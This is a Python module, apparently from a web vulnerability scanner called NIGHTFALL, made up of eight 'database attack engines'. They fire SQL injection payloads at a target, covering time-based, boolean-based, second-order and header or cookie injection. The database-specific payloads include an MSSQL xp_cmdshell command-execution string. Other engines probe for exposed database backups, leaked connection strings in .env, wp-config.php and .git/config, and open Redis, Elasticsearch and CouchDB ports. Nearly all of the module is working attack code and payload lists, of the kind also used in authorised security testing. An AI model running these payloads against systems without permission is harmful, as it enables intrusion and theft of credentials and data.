"""
Falcon MAG - NIGHTFALL Advanced Database Attack Engines
8 new engines for database vulnerabilities:
1. Blind SQLi (Time-based)
2. Blind SQLi (Boolean-based)
3. Second-Order SQLi
4. Header/Cookie SQLi
5. DB-Specific (PostgreSQL, MySQL, MSSQL, Oracle)
6. Database Backup Files
7. Connection String Leakage
8. NoSQL Services (Redis, Elasticsearch, CouchDB, Cassandra)
"""
from __future__ import annotations

import asyncio
import time
import re
from typing import Any, Optional
from urllib.parse import urlparse, urljoin, quote


# ============================================================
# 1. Blind SQLi - Time-based
# ============================================================

TIME_PAYLOADS = {
    "mysql": ["' AND SLEEP(5)-- -", "' OR SLEEP(5)-- -", "\" AND SLEEP(5)-- -", "1' AND SLEEP(5)#"],
    "mssql": ["'; WAITFOR DELAY '0:0:5'-- -", "1'; WAITFOR DELAY '0:0:5'-- -", "' OR WAITFOR DELAY '0:0:5'-- -"],
    "postgresql": ["'; SELECT pg_sleep(5)-- -", "' OR pg_sleep(5)-- -", "1'; SELECT pg_sleep(5)-- -"],
    "oracle": ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -"],
}

BOOLEAN_PAYLOADS = {
    "true": ["' AND 1=1-- -", "' AND '1'='1", "1 AND 1=1", "1' AND '1'='1"],
    "false": ["' AND 1=2-- -", "' AND '1'='2", "1 AND 1=2", "1' AND '1'='2"],
}


async def test_blind_sqli_time(pool, endpoint: str, params: list, threshold: float = 4.0):
    """
    Test for time-based blind SQL injection.
    Compares response time with and without time-delay payloads.
    """
    findings = []
    if not params:
        return findings

    for param in params[:5]:  # Limit to 5 params
        # Baseline: normal request
        baseline_resp = await pool.send("GET", endpoint)
        baseline_time = baseline_resp.elapsed_ms / 1000.0
        baseline_len = len(baseline_resp.text)

        for db_type, payloads in TIME_PAYLOADS.items():
            for payload in payloads[:2]:
                # Build test URL
                sep = "&" if "?" in endpoint else "?"
                test_url = f"{endpoint}{sep}{param}={quote(payload)}"

                start = time.monotonic()
                resp = await pool.send("GET", test_url)
                elapsed = time.monotonic() - start

                # Detect significant time delay (> threshold AND much slower than baseline)
                if elapsed > threshold and elapsed > baseline_time + 3.0:
                    findings.append({
                        "vuln_class": "sqli",
                        "subtype": f"blind_time_{db_type}",
                        "severity": "critical",
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "evidence": f"Response delayed by {elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
                        "confidence": "high",
                    })
                    break  # One finding per param
            else:
                continue
            break  # Found in this param, move to next

    return findings


# ============================================================
# 2. Blind SQLi - Boolean-based
# ============================================================

async def test_blind_sqli_boolean(pool, endpoint: str, params: list):
    """
    Test for boolean-based blind SQL injection.
    Compares response length/content for TRUE vs FALSE payloads.
    """
    findings = []
    if not params:
        return findings

    for param in params[:5]:
        # Baseline
        baseline_resp = await pool.send("GET", endpoint)
        baseline_len = len(baseline_resp.text)

        true_responses = []
        false_responses = []

        for payload in BOOLEAN_PAYLOADS["true"][:2]:
            sep = "&" if "?" in endpoint else "?"
            test_url = f"{endpoint}{sep}{param}={quote(payload)}"
            resp = await pool.send("GET", test_url)
            true_responses.append(len(resp.text))

        for payload in BOOLEAN_PAYLOADS["false"][:2]:
            sep = "&" if "?" in endpoint else "?"
            test_url = f"{endpoint}{sep}{param}={quote(payload)}"
            resp = await pool.send("GET", test_url)
            false_responses.append(len(resp.text))

        if not true_responses or not false_responses:
            continue

        avg_true = sum(true_responses) / len(true_responses)
        avg_false = sum(false_responses) / len(false_responses)

        # Significant difference in response length
        diff = abs(avg_true - avg_false)
        if diff > 100 and diff > baseline_len * 0.05:
            findings.append({
                "vuln_class": "sqli",
                "subtype": "blind_boolean",
                "severity": "critical",
                "url": endpoint,
                "param": param,
                "payload": f"true_avg={avg_true:.0f}, false_avg={avg_false:.0f}",
                "evidence": f"Response length differs by {diff:.0f} bytes",
                "confidence": "medium",
            })

    return findings


# ============================================================
# 3. Second-Order SQLi
# ============================================================

async def test_second_order_sqli(pool, endpoints: list, forms: list):
    """
    Test for second-order SQL injection.
    Injects payload in one place, triggers in another.
    """
    findings = []
    payload = "' AND SLEEP(3)-- -"
    marker = "NIGHTFALL_SOI_MARKER"

    # Try to inject into forms
    for form in forms[:5]:
        action = form.get("action", "")
        method = form.get("method", "GET").upper()

        if method != "POST":
            continue

        try:
            # Inject in every field
            data = {}
            for field in form.get("fields", [])[:5]:
                name = field.get("name", "")
                if name:
                    data[name] = payload

            # Send POST
            resp = await pool.send("POST", action, data=data)
            if resp.status in (200, 302):
                # Try to trigger by requesting related pages
                for check_url in endpoints[:10]:
                    check_resp = await pool.send("GET", check_url)
                    if "SQL" in check_resp.text or "syntax" in check_resp.text.lower():
                        findings.append({
                            "vuln_class": "sqli",
                            "subtype": "second_order",
                            "severity": "high",
                            "url": action,
                            "param": ",".join(data.keys()),
                            "payload": payload,
                            "evidence": f"SQL error triggered at {check_url}",
                            "confidence": "low",
                        })
                        break
        except Exception:
            continue

    return findings


# ============================================================
# 4. Header/Cookie SQLi
# ============================================================

async def test_header_sqli(pool, target: str):
    """
    Test SQL injection via HTTP headers (User-Agent, Referer, X-Forwarded-For).
    """
    findings = []
    payloads = ["' AND SLEEP(3)-- -", "' OR 1=1-- -", "\" OR \"1\"=\"1"]
    headers_to_test = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP", "Cookie"]

    # Baseline
    baseline_resp = await pool.send("GET", target)
    baseline_time = baseline_resp.elapsed_ms / 1000.0

    for header in headers_to_test:
        for payload in payloads:
            try:
                test_headers = {header: payload}
                start = time.monotonic()
                resp = await pool.send("GET", target, headers=test_headers)
                elapsed = time.monotonic() - start

                # Time-based detection
                if elapsed > 2.5 and elapsed > baseline_time + 2.0:
                    findings.append({
                        "vuln_class": "sqli",
                        "subtype": f"header_{header.lower().replace('-', '_')}",
                        "severity": "high",
                        "url": target,
                        "param": header,
                        "payload": payload,
                        "evidence": f"Header injection delayed response by {elapsed:.2f}s",
                        "confidence": "medium",
                    })
                    break

                # Error-based detection
                if resp.status == 500:
                    findings.append({
                        "vuln_class": "sqli",
                        "subtype": f"header_{header.lower().replace('-', '_')}",
                        "severity": "medium",
                        "url": target,
                        "param": header,
                        "payload": payload,
                        "evidence": f"HTTP 500 with payload in {header}",
                        "confidence": "low",
                    })
                    break
            except Exception:
                continue

    return findings


# ============================================================
# 5. DB-Specific Payloads
# ============================================================

DB_SPECIFIC_PAYLOADS = {
    "mysql": [
        "' UNION SELECT @@version-- -",
        "' AND extractvalue(1,concat(0x7e,@@version))-- -",
        "' AND updatexml(1,concat(0x7e,@@version),1)-- -",
    ],
    "postgresql": [
        "'; SELECT version()-- -",
        "' UNION SELECT version()-- -",
        "' AND 1=cast(version() as int)-- -",
    ],
    "mssql": [
        "'; SELECT @@version-- -",
        "' UNION SELECT @@version-- -",
        "'; EXEC xp_cmdshell('whoami')-- -",
    ],
    "oracle": [
        "' UNION SELECT banner FROM v$version-- -",
        "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version))-- -",
    ],
}


async def test_db_specific(pool, endpoint: str, params: list, db_type: str = "mysql"):
    """Test database-specific SQL injection payloads."""
    findings = []
    if not params or db_type not in DB_SPECIFIC_PAYLOADS:
        return findings

    error_signatures = [
        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "Microsoft OLE DB",
        "SQLServer", "sqlite", "syntax error", "unclosed quotation",
    ]

    for param in params[:3]:
        for payload in DB_SPECIFIC_PAYLOADS[db_type]:
            sep = "&" if "?" in endpoint else "?"
            test_url = f"{endpoint}{sep}{param}={quote(payload)}"
            resp = await pool.send("GET", test_url)

            for sig in error_signatures:
                if sig.lower() in resp.text.lower():
                    findings.append({
                        "vuln_class": "sqli",
                        "subtype": f"db_{db_type}",
                        "severity": "critical",
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "evidence": f"DB error signature '{sig}' found",
                        "confidence": "high",
                    })
                    break

    return findings


# ============================================================
# 6. Database Backup Files
# ============================================================

DB_BACKUP_PATHS = [
    "backup.sql", "db.sql", "database.sql", "dump.sql", "backup.zip",
    "backup.tar.gz", "db.sqlite", "db.sqlite3", "database.db",
    "backup.bak", "data.bak", "site.bak", "db.dump", "backup.dump",
    "mysql.sql", "postgres.sql", "wordpress.sql", "wp-content/database.sql",
    "backups/", "backup/", "db_backup/", "database_backup/",
]


async def test_db_backup_files(pool, base_url: str):
    """Discover exposed database backup files."""
    findings = []
    parsed = urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"

    for path in DB_BACKUP_PATHS:
        test_url = f"{root}/{path}"
        try:
            resp = await pool.send("GET", test_url)
            if resp.status == 200 and len(resp.text) > 100:
                # Check content-type
                ct = resp.headers.get("Content-Type", "").lower()
                # SQL dump / backup patterns
                is_backup = any(p in resp.text[:500].lower() for p in [
                    "insert into", "create table", "mysqldump", "pg_dump",
                    "sqlite format", "-- mysql", "-- postgresql",
                ])

                if is_backup or any(x in ct for x in ["sql", "octet-stream", "zip", "x-sqlite"]):
                    findings.append({
                        "vuln_class": "db_backup_exposure",
                        "subtype": "backup_file",
                        "severity": "critical",
                        "url": test_url,
                        "param": "",
                        "payload": path,
                        "evidence": f"Backup file accessible ({len(resp.text)} bytes, {ct})",
                        "confidence": "high",
                    })
        except Exception:
            continue

    return findings


# ============================================================
# 7. Connection String Leakage
# ============================================================

CONN_STRING_PATTERNS = [
    (r"mysql://[^\s\"'<>]+", "mysql_conn"),
    (r"postgres://[^\s\"'<>]+", "postgres_conn"),
    (r"postgresql://[^\s\"'<>]+", "postgresql_conn"),
    (r"mongodb://[^\s\"'<>]+", "mongodb_conn"),
    (r"mongodb\+srv://[^\s\"'<>]+", "mongodb_srv"),
    (r"redis://[^\s\"'<>]+", "redis_conn"),
    (r"amqp://[^\s\"'<>]+", "amqp_conn"),
    (r"Server=[^;]+;Database=[^;]+;User Id=[^;]+;Password=[^;]+", "mssql_conn"),
    (r"Data Source=[^;]+;Initial Catalog=[^;]+", "mssql_conn2"),
    (r"jdbc:mysql://[^\s\"'<>]+", "jdbc_mysql"),
    (r"jdbc:postgresql://[^\s\"'<>]+", "jdbc_pg"),
]

CONN_STRING_URLS = [
    ".env", ".env.local", ".env.production", ".env.backup",
    "config.js", "config.json", "config.yml", "config.yaml",
    "appsettings.json", "web.config", "settings.py",
    "docker-compose.yml", "docker-compose.yaml",
    ".git/config", "wp-config.php", "config.php",
]


async def test_conn_string_leak(pool, base_url: str):
    """Detect leaked database connection strings in config files."""
    findings = []
    parsed = urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"

    for path in CONN_STRING_URLS:
        test_url = f"{root}/{path}"
        try:
            resp = await pool.send("GET", test_url)
            if resp.status != 200 or len(resp.text) < 20:
                continue

            for pattern, name in CONN_STRING_PATTERNS:
                matches = re.findall(pattern, resp.text, re.IGNORECASE)
                if matches:
                    # Redact for safety
                    masked = matches[0][:30] + "***"
                    findings.append({
                        "vuln_class": "conn_string_leak",
                        "subtype": name,
                        "severity": "critical",
                        "url": test_url,
                        "param": "",
                        "payload": path,
                        "evidence": f"Found: {masked}",
                        "confidence": "high",
                    })
                    break
        except Exception:
            continue

    return findings


# ============================================================
# 8. NoSQL / Cache Services Exposure
# ============================================================

NOSQL_SERVICES = [
    # (path, service_name, response_signature)
    ("/", "redis", "redis_version"),
    ("/info", "redis", "redis_version"),
    ("/", "elasticsearch", "cluster_name"),
    ("/_cluster/health", "elasticsearch", "cluster_name"),
    ("/_cat/indices", "elasticsearch", "health"),
    ("/_all/_search", "elasticsearch", "hits"),
    ("/", "couchdb", "couchdb"),
    ("/_all_dbs", "couchdb", "couchdb"),
    ("/", "cassandra", "cassandra"),
    ("/", "memcached", "STAT"),
    ("/", "kibana", "kibana"),
    ("/api/status", "kibana", "version"),
]


async def test_nosql_services(pool, base_url: str):
    """
    Detect exposed NoSQL / cache services via HTTP interfaces.
    Note: Only detects HTTP-based interfaces (Redis/ES/CouchDB web ports).
    """
    findings = []
    parsed = urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"

    # Common non-standard ports
    ports = [9200, 9300, 5601, 5984, 6379, 11211, 8086, 27017]

    for port in ports:
        for path, service, signature in NOSQL_SERVICES:
            test_url = f"{parsed.scheme}://{parsed.hostname}:{port}{path}"
            try:
                resp = await pool.send("GET", test_url)
                if resp.status == 200 and signature.lower() in resp.text.lower()[:2000]:
                    findings.append({
                        "vuln_class": "nosql_exposure",
                        "subtype": service,
                        "severity": "high",
                        "url": test_url,
                        "param": str(port),
                        "payload": path,
                        "evidence": f"{service} exposed on port {port}",
                        "confidence": "high",
                    })
                    break  # One finding per port
            except Exception:
                continue

    return findings


# ============================================================
# Main orchestrator
# ============================================================

async def run_db_advanced_tests(pool, crawl_result: dict, oast=None) -> list:
    """
    Run all 8 advanced database attack engines.
    Returns combined list of findings.
    """
    all_findings = []
    target = pool.config.target if hasattr(pool.config, "target") else ""
    base_url = target

    # Extract endpoints and params from crawl
    endpoints = crawl_result.get("endpoints", []) if crawl_result else []
    forms = crawl_result.get("forms", []) if crawl_result else []

    # Build endpoint-param mapping
    endpoint_params = {}
    for ep in endpoints[:20]:
        if "?" in ep:
            base, query = ep.split("?", 1)
            params = [p.split("=")[0] for p in query.split("&") if "=" in p]
            if params:
                endpoint_params[base] = params

    # If no params found, use common ones
    if not endpoint_params:
        common_params = ["id", "q", "s", "search", "page", "cat", "user", "name"]
        for ep in endpoints[:5]:
            endpoint_params[ep] = common_params

    try:
        # 1. Time-based Blind SQLi
        for ep, params in list(endpoint_params.items())[:3]:
            findings = await test_blind_sqli_time(pool, ep, params)
            all_findings.extend(findings)

        # 2. Boolean-based Blind SQLi
        for ep, params in list(endpoint_params.items())[:3]:
            findings = await test_blind_sqli_boolean(pool, ep, params)
            all_findings.extend(findings)

        # 3. Second-Order SQLi
        if forms:
            findings = await test_second_order_sqli(pool, endpoints, forms)
            all_findings.extend(findings)

        # 4. Header/Cookie SQLi
        if base_url:
            findings = await test_header_sqli(pool, base_url)
            all_findings.extend(findings)

        # 5. DB-Specific payloads
        for ep, params in list(endpoint_params.items())[:2]:
            for db_type in ["mysql", "postgresql", "mssql"]:
                findings = await test_db_specific(pool, ep, params, db_type)
                all_findings.extend(findings)

        # 6. Backup files
        if base_url:
            findings = await test_db_backup_files(pool, base_url)
            all_findings.extend(findings)

        # 7. Connection string leakage
        if base_url:
            findings = await test_conn_string_leak(pool, base_url)
            all_findings.extend(findings)

        # 8. NoSQL services
        if base_url:
            findings = await test_nosql_services(pool, base_url)
            all_findings.extend(findings)

    except Exception as exc:
        # Log error but don't crash scan
        try:
            from nightfall_core import log
            log.warning("db_advanced_tests_error", error=str(exc))
        except Exception:
            pass

    return all_findings